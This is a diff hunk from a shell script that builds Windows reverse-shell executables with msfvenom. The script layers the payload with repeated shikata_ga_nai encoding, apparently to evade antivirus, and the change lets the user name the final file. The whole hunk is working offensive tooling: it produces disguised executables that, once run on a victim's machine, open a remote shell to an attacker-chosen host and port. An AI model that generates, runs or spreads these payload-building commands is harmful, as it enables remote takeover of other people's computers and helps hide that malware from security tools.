@@ -73,7 +73,7 @@ elif [ ${os} = "2" ]; then
 	sudo msfvenom -p windows/x64/shell/reverse_tcp --platform windows --arch x64 -e x86/shikata_ga_nai LHOST=${host} LPORT=${port} -i -20 -f exe -o .windows.exe
 	sudo msfvenom -p windows/x64/shell/reverse_tcp --platform windows --arch x64 -e x86/shikata_ga_nai LHOST=${host} LPORT=${port} -i -20 -f exe -x .windows.exe  -o .windows1.exe
 	sudo msfvenom -p windows/x64/shell/reverse_tcp --platform windows --arch x64 -e x86/shikata_ga_nai LHOST=${host} LPORT=${port} -i -20 -f exe -x .windows1.exe -o .windows2.exe
-	sudo msfvenom -p windows/x64/shell/reverse_tcp --platform windows --arch x64 -e x86/shikata_ga_nai LHOST=${host} LPORT=${port} -i -20 -f exe -x .windows2.exe -o windowsfinal.exe
+	sudo msfvenom -p windows/x64/shell/reverse_tcp --platform windows --arch x64 -e x86/shikata_ga_nai LHOST=${host} LPORT=${port} -i -20 -f exe -x .windows2.exe -o ${name}.exe
 	$(rm -rf .windows.exe .windows1.exe .windows2.exe)
 #elif [ ${os} = "3" ]; then
 	#echo -n "What name you would like to give to the Linux payload => "
